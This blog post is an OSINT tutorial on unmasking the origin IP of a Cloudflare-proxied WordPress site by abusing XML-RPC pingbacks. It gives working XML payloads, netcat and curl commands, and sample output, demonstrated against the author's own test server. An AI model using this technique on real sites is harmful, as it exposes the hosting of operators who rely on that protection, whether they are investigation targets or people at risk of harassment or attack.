---
layout: post
title: Discovering the IP address of a Wordpress site hidden behind Cloudflare
description: Use pingbacks to expose the IP address of a Wordpress site proxied by Cloudflare
tags:
  - cloudflare
  - wordpress
  - infosec
  - osint
headerImage: 2020/01/portugal-3029665_1920.jpg
headerImageAttrib: Julius Silver @ pixabay.com
---

Background
==========

[Cloudflare](https://www.cloudflare.com) is a company that provides domain name
(DNS) services, Distributed Denial of Service (DDoS) protection, and a content
delivery network (CDN) to its customers. These services support websites in
delivering consistent, quick, and highly-available content to users. Cloudflare,
having both free and paid tiers of service, has gained a large market share in
the past decade - about 20% of the CDN space overall and over 40% of the Alexa
Top One Million websites.

For this reason, investigators will often come across websites protected by
Cloudflare while researching researching a target with a web presense. I use
the word "protected" for a specific reason. As part of its free offering, 
Cloudflare DNS offers the option to "proxy" traffic on behalf of the backend
website. This allows Cloudflare to replicate the website content across the
world, generally offering an improved website loading speed by taking advantage
of the company's worldwide scale. This also has the effect of hiding some of the
website's identifying features from anyone except Cloudflare itself, such as
the website's IP address.

With an IP address you can do many things, including identify other websites
owned by the same webmaster or even identify the user themselves (with the
proper warrant), so this bit of data is crucial to many OSINT investigations.
Bad actors know this too and they take full advantage of Cloudflare's
protective features. This, coupled with a relatively "hands off" approach
from Cloudflare, means the company has gotten in a few scrapes about whether
or not it is doing enough to stop the spread of [child abuse imagery](https://www.bbc.com/news/technology-50138970)
or [white nationalist content](https://www.wired.com/story/free-speech-issue-cloudflare/)
on its networks. Without much help from Cloudflare's support team, investigators
are often forced to find ways around Cloudflare's IP protection.

There are a lot of cool tools, including [Francisco Poldi's *fav-up*](https://github.com/pielco11/fav-up),
[Crimeflare](http://www.crimeflare.org:82/cfs.html) and techniques shared in
[this SecJuice post](https://www.secjuice.com/finding-real-ips-of-origin-servers-behind-cloudflare-or-tor/),
to identify the true IP address behind a Cloudflare-protected domain,
but today I'm going to talk about a technique to identify the IP address of
a Wordpress website that is hidden behind Cloudflare.

Wordpress is a very popular website Content Management System (CMS) and has
gained a reputation for being vulnerable to attacks because webmasters often
do not apply the latest patches and updates. However, we don't need to rely on
attacks for this. We can find the IP address using nothing more than a plain
Wordpress install with default settings and a couple of web tools.

These web tools will take advantage of a feature called "Pingbacks" that is
enabled by default in most Wordpress instances. Pingbacks allow different
Wordpress websites to build links between each other when a post on one
blog links to another blog. The pingback creates a "reverse link" back from
the page you've linked to your own newly published blog page, a bit reminiscient
of the 1990s "blog rings" where blogs would link to related blogs in order to
generate traffic to their friends and community.

The way this works is that a pingback request convinces the *target Wordpress server*
to reach out to a user-controlled server to negotiate a pingback. Unless the
target has disabled pingbacks or manually edited the Wordpress installation
to obfuscate the IP source, the Wordpress server itself will contact your
pingback server and this will expose their IP address to you.

Take the following diagram showing the normal communication with Cloudflare
and the Wordpress site. Cloudflare will not divulge the IP address it uses
to communicate with the backend, which forces us to find another way around.

![normal cloudflare proxy flow](/images/2020/01/cloudflare-wordpress-normal.png)

Compare with this next diagram, showing how a pingback will convince the
Wordpress server to reach out to our "honeypot" pingback server which relays
the IP address it finds back to us.

![cloudflare proxy flow with pingback](/images/2020/01/cloudflare-wordpress-bypass.png)


Setup
=====

To avoid "exploiting" an existing site, I temporarily* spun up a Wordpress
instance in a DigitalOcean server that I will use to demonstrate the IP
address leak. The very first thing I did after setting up the server was
enable the Cloudflare proxy between my site and the domain, so the origin
IP could not have been leaked through normal channels.

\* I will leave this site up for a short time, feel free to test the technique
while it's available :)

![wordpress homepage](/images/2020/01/wordpress-homepage.png)

To test this, I've pinged my test hostname:

    ping wordpress.nem.ec

Which returns the following IP address:

    104.28.27.49

![ping command output showing IP](/images/2020/01/ping-wordpress-ip.png)

Plug this IP address into any IP lookup site, such as [myip.ms](https://myip.ms/info/whois/104.28.27.49),
and you will see that the IP address owner is "Cloudflare, Inc" - as expected.
The same applies if you look up [the domain name](https://myip.ms/info/whois/104.28.26.49/k/251136401/website/wordpress.nem.ec)
directly.

![myip.ms demonstration](/images/2020/01/myip-ms.png)


In order to discover the private IP address behind my server, there are two
approaches you can take. One relies upon two web tools to probe the Wordpress
site and gather data, the other uses widely available Linux command line
applications to gather the same data. Personally, I prefer to use the web tools
in *all cases* to unmask the IP address behind protected websites for one
simple reason - the web tools hide your *own* IP address from the (potentially
criminal) targets who control the target web page. In both cases, this will
not be "passive" reconnaissance - there is a good chance that your probe will
appear in the target's access logs (if the target monitors them), so the more
layers you can keep between you and them, the better. Still, I will demonstrate
both the web tools and the Linux tools because OSINT practitioners should be
open to building their own tools. These web tools may disappear from the
internet at any point in time and I would like to at least provide a reference
to look back at while evaluating alternative web tools or building one yourself.


Web Tools (Recommended)
=======================

To begin, we need to verify that pingbacks are enabled on the server.
Load your target Wordpress site in your browser and open any blog post. Modify
the URL and add `view-source:` to the beginning and hit Enter to view the
source code for the page. Press `Ctrl+F` and search for the word `pingback`. If
pingbacks are enabled, there will be a URL inside the "href" attribute linked
to the pingback element (e.g. `<link rel="pingback" href="https://wordpress.nem.ec/xmlrpc.php">`)

![pingback source](/images/2020/01/pingback-enabled.png)

Note both the pingback URL *and* the full URL to the blog post for later.

Pingback URL

    https://wordpress.nem.ec/xmlrpc.php

Blog Post URL

    https://wordpress.nem.ec/2020/01/22/hello-world/


Now, load the following website in your browser: https://webhook.site/

If this is the first time loading the site, you will be redirected to a
brand new unique URL (e.g. `https://webhook.site/#!/e1f36ec8-850a-4cc3-b3dc-c3d19448a6b2`)
and the website will begin "Waiting for first request...". If you've used
the website before, you may see some old requests listed in the sidebar. That's
ok, you can ignore them.

![webhook.site screenshot](/images/2020/01/webhook-site.png)

Now visit the URL https://reqbin.com/ in your browser. Click on the `Content`
tab and choose `XML (application/xml)` as your content type instead of the
default:

![reqbin content type selected](/images/2020/01/reqbin-content-type.png)

Now, change the `GET` dropdown to `POST` and paste the Pingback URL you recorded
earlier into the URL box next to the dropdown:

![reqbin POST URL](/images/2020/01/reqbin-url.png)

After that, copy and paste the following template into the XML content text area:

```
<?xml version="1.0" encoding="iso-8859-1"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
 <param>
  <value>
   <string>https://webhook.site/e1f36ec8-850a-4cc3-b3dc-c3d19448a6b2</string>
  </value>
 </param>
 <param>
  <value>
   <string>https://wordpress.nem.ec/2020/01/22/hello-world/</string>
  </value>
 </param>
</params>
</methodCall>
```

You must replace both URLs in the template with ones of your own. The first is
your *own* unique webhook.site URL that you found at the beginning of this
section. The second is the complete blog post URL you also recorded earlier.

![reqbin content template](/images/2020/01/reqbin-content.png)

Click "Send" and wait for a response from the server. If the server attempts
to redirect you to the homepage this likely means the server has installed
software to block pingbacks. I ran into this frustrating problem with my
own install (although I re-enabled them so that I could write this post!) and
it isn't something you can test until you send your first request. If this
happens, the website has protected itself from pingbacks and you cannot uncover
their IP address with this technique.

This method is, additionally, a bit of a blind process. Whether your check
succeeds or not, you should expect to get a "faultCode" of 0 back from the server
after your request. The XML looks like this:

```
<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <fault>
    <value>
      <struct>
        <member>
          <name>faultCode</name>
          <value><int>0</int></value>
        </member>
        <member>
          <name>faultString</name>
          <value><string></string></value>
        </member>
      </struct>
    </value>
  </fault>
</methodResponse>
```

Therefore, the only way you can tell that you were successful is by checking
the request log on your https://webhook.site tab. After sending my previous
request, this is what I see:

![reqbin log](/images/2020/01/reqbin-success.png)

Success! There is one request found and it displays a new IP address that
we haven't seen before. If you click on the small "whois" link next to the IP,
it displays exactly what we're looking for:

    DigitalOcean, LLC DO-13 (NET-64-225-0-0-1) 64.225.0.0 - 64.225.127.255

As further confirmation, the IP address `64.225.37.249` does, in fact, match
the IP address I was assigned after registering this DigitalOcean server.
Congratulations, you've peeked behind the Cloudflare curtain and exposed my
server IP!

Apply the same tactic to any Wordpress site you're investigating if you
suspect they are proxying their IP address.


Linux Tools
===========

As an alternative to the capable web tools in the previous section, we can use
some standard Linux command line applications to accomplish the same task. We
require the `netcat` and `curl` applications, as well as access to open a port
on your router/firewall.

Follow the first paragraph of the previous section to record your Pingback URL
and Blog Post URL

Pingback URL

    https://wordpress.nem.ec/xmlrpc.php

Blog Post URL

    https://wordpress.nem.ec/2020/01/22/hello-world/

Now go into your router and forward TCP port 80 to your PC. In my experience,
Wordpress will refuse to send a pingback to ports other than 80 or 443 (https)
so it needs to be port 80. If your router allows, you can redirect the router
port to some other range on your own PC. The method for doing this
will differ for every router. Consult your manual if necessary.

![opened port](/images/2020/01/port-open.png)

Next, find your *public* IP address. You can find this with the following
command, if necessary:

    curl -4 icanhazip.com

In an empty terminal window, run the following command. It will wait for a new
connection from the target Wordpress server.

    sudo netcat -v -l -p 80

Create a new file called `pingback.xml` with the following contents.
Replace the first URL (`10.0.0.1`) with your *own* public IP address and port.
Leave the fake "path" alone because some Wordpress installs will refuse to
pingback a plain domain to reduce abuse and spam.
Replace the second URL with the URL of a blog post on the target server.

```
<?xml version="1.0" encoding="iso-8859-1"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
 <param>
  <value>
   <string>http://10.0.0.1/hello/world</string>
  </value>
 </param>
 <param>
  <value>
   <string>https://wordpress.nem.ec/2020/01/22/hello-world/</string>
  </value>
 </param>
</params>
</methodCall>
```

Now run the following command. `pingback.xml` is the relative path to the file
you just created and `https://wordpress.nem.ec/xmlrpc.php` should be replaced
with the pingback URL from the start of this section.

    curl -X POST -d @pingback.xml https://wordpress.nem.ec/xmlrpc.php

After executing the command, wait some time for data to appear in your netcat
session. It will look something like the following:

```
listening on [any] 80 ...
64.225.37.249: inverse host lookup failed: Unknown host
connect to [10.0.0.2] from (UNKNOWN) [64.225.37.249] 47647
GET /some/site HTTP/1.1
Host: 10.0.0.1
User-Agent: WordPress/5.3.2; https://wordpress.nem.ec; verifying pingback from 10.0.0.1
Accept: */*
Accept-Encoding: deflate, gzip
Referer: http://10.0.0.1/hello/world
X-Pingback-Forwarded-For: 10.0.0.1
Connection: close
```

Check the second line of the output to get the IP address of the Wordpress server.
As before, the hidden value is `64.225.37.249`.


Verifying the IP Address
========================

Now that you have an IP address, how can you check that it's real? One simple
way is to make a cURL request and fake the Host header to pretend like it's
coming from the server's hostname.

Example:

    curl -k -H 'wordpress.nem.ec' https://64.225.37.249

![verifying the IP address. result includes my wordpress blog URL](/images/2020/01/verify-ip.png)

This may not work if your target website runs on shared hosting with a shared IP,
which will use a technique called Server Name Indication (SNI) to run multiple
HTTPS websites on a single IP address. To fix this, cURL offers a `--resolve`
argument to explicitly map a domain name and port to an IP address instead of
using the traditional DNS lookup. It *must* include the port and full domain name.

    curl -k --resolve wordpress.nem.ec:443:64.225.37.249 https://wordpress.nem.ec

![verifying the IP address with the resolve argument](/images/2020/01/verify-ip-sni.png)

And that's it. Happy hunting!